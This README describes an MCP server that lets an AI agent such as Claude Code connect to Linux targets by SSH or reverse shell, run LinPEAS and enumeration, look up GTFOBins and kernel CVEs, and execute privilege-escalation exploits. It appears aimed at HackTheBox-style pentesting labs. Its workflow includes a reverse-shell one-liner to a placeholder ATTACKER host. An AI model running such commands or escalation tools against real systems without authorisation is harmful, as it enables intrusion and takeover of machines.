# linux-privesc-mcp

Active Linux privilege escalation MCP server. Connects to targets via
**SSH or reverse shell**, runs enumeration and exploits remotely, then
analyzes output with an offline knowledge base (GTFOBins, kernel CVEs,
exploit recipes).

## Tools (16)

### Connection (5)
| Tool | Purpose |
|------|---------|
| `connect_ssh` | Connect to target via SSH (password or key) |
| `start_listener` | Start TCP listener for reverse shells |
| `check_listener` | Check if a reverse shell connected |
| `sessions` | List sessions or switch active session |
| `disconnect` | Close a session |

### Execution (6)
| Tool | Purpose |
|------|---------|
| `exec_on_target` | Run any command on the target |
| `upload_to_target` | Upload file to target (SFTP or base64) |
| `download_from_target` | Download file from target |
| `run_linpeas` | Upload + run LinPEAS + auto-analyze output |
| `run_enum` | Targeted enumeration with auto-analysis |
| `check_privesc` | Check current privilege level (got root?) |

### Analysis (5)
| Tool | Purpose |
|------|---------|
| `analyze_output` | Parse sudo/suid/caps/cron/writable/linpeas output |
| `gtfobins_lookup` | Offline GTFOBins DB (~75 binaries) |
| `kernel_exploit_check` | Kernel CVE matching + PoC links |
| `privesc_recipe` | Step-by-step exploit playbooks |
| `enum_commands` | Get enumeration one-liners |

## Workflow

```python
# 1. Connect via SSH
connect_ssh(host="10.10.10.5", username="user", password="pass123")

# 2. Or via reverse shell
start_listener(port=4444)
# trigger: bash -i >& /dev/tcp/ATTACKER/4444 0>&1
check_listener()

# 3. Run enumeration (auto-analyzes results)
run_enum(targets=["sudo", "suid", "caps", "kernel"])

# 4. Or run LinPEAS (uploads, runs, analyzes, cleans up)
run_linpeas()

# 5. Look up specific binaries
gtfobins_lookup(binaries=["/usr/bin/vim", "/usr/bin/python3"])

# 6. Get exploit recipe
privesc_recipe(vector="pwnkit")

# 7. Execute the exploit
exec_on_target("./exploit")

# 8. Verify root
check_privesc()
```

## Multi-session support

```python
connect_ssh(host="10.10.10.5", username="user1", password="pass1")
connect_ssh(host="10.10.10.6", username="user2", key_path="~/.ssh/id_rsa")
sessions()                    # list all
sessions(switch_to="ssh1")    # switch active
exec_on_target("id")          # runs on active session
```

## Installation

```bash
pip install -r requirements.txt   # mcp + paramiko
```

### Register with Claude Code

```json
"linux_privesc": {
  "type": "stdio",
  "command": "python3",
  "args": ["/home/kali/hackthebox/ai-pentest/custom_mcps/linux-privesc-mcp/server.py"],
  "env": {}
}
```

## Testing

```bash
python3 tests/test_linpeas_filter.py   # 10 tests
python3 tests/test_modules.py          # 24 tests
```

## Files

```
linux-privesc-mcp/
├── server.py              FastMCP entry (16 tools)
├── session_manager.py     Unified session manager
├── transport_ssh.py       SSH transport (paramiko)
├── transport_revshell.py  Reverse shell transport (TCP listener)
├── linpeas_filter.py      ANSI SGR parser for LinPEAS
├── gtfobins.py            Offline GTFOBins DB
├── kernel_cves.py         Kernel + userland CVE database
├── recipes.py             Enum scripts + exploit playbooks
├── tests/
│   ├── test_linpeas_filter.py
│   └── test_modules.py
├── requirements.txt
└── README.md
```
